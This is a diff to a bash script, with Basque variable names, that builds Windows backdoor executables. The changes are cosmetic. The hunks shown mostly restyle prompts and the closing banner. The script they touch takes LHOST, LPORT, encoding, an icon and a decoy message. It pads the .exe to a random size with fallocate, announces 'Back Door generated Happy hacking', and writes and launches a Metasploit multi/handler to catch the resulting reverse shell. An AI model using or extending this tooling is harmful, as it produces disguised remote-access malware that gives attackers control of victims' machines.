@@ -230,7 +230,7 @@ fi
 esac
 
 #ikonoa
-echo -e "backdoor icon? y or n : \c"
+echo -e "backdoor icon? y or n =>  \c"
 read icon
 if [[ $icon != "y" && $icon != "n" ]]; then 
 echo -e '\e[0;31m【!!】 Invalid option, write y or n \e[0m'
@@ -238,13 +238,13 @@ exit
 fi
 
 #Mezua
-echo -e "Display an message? y or n : \c"
+echo -e "Display an message? y or n =>  \c"
 read error
 case $error in
 y) 
-echo -e "Title message : \c"
+echo -e "Title message =>  \c"
 read izenburua  
-echo -e "Message : \c"
+echo -e "Message =>  \c"
 read textua
 ;;
 n)
@@ -254,7 +254,7 @@ echo -e '\e[0;31m【!!】 Invalid option, write y or n \e[0m'
 exit
 ;;
 esac
-echo -e "Enter file name: \c"
+echo -e "Enter file name =>  \c"
 read izena
 echo ""
 echo "Please wait"
@@ -344,22 +344,25 @@ luzeera=`echo $(($tamainua + $RANDOM%2000))`
 fallocate -o $offset -l $luzeera $dir/output/$izena.exe
 
 sleep 1
-echo ""
+echo "============================================================================"
+echo "="
+echo "="
 echo -e '\e[0;31mCONGRATULATIONS  Back Door generated Happy hacking.....!!\e[0m'
 echo ""
-echo "Payload file= $dir/output/$izena.exe"
-echo "Payload size= `stat -c %s $dir/output/$izena.exe` Bytes"
-echo ""
+echo "=    BACKDOOR FILE= $dir/output/$izena.exe"
+echo "=    BACKDOOR SIZE= `stat -c %s $dir/output/$izena.exe` Bytes"
+echo "=    LHOST=$ip"
+echo "=    LPORT=$port"         
+echo "=    ENCODED BACKDOOR=$encoded" 
+echo "=    PAYLOAD=${payload^^}"	       
+echo "=    NUMBER OF ITERATIONS=$int"
+echo "=    ICON=${icon^^}"
+echo "=    MESSAGE=${error^^}"
+echo "="
+echo "="
+echo "============================================================================"
 sleep 2
-echo ""
-echo "*****************************************************************************"	
-echo "*    LHOST=$ip			       NUMBER OF ITERATIONS=$int       *"
-echo "*    LPORT=$port			                                            *"         
-echo "*    ENCODED PAYLOAD=$encoded                                                      " 
-echo "*    PAYLOAD=${payload^^}                                *"	       
-echo "*****************************************************************************"
-sleep 2
-echo -e "Start handler? y or n: \c"
+echo -e "Start handler? y or n => \c"
 read handler
 if [ "$handler" == "y" ]; then
 echo "use exploit/multi/handler" >> $dir/handler/handler.rc
@@ -372,7 +375,7 @@ echo "exploit -j" >> $dir/handler/handler.rc
 msfconsole -r $dir/handler/handler.rc
 sleep 2
 else
-echo -e '\e[0;31mExit....\e[0m'
+echo -e '\e[0;31mExit==========>\e[0m'
 sleep 1
 exit
 fi
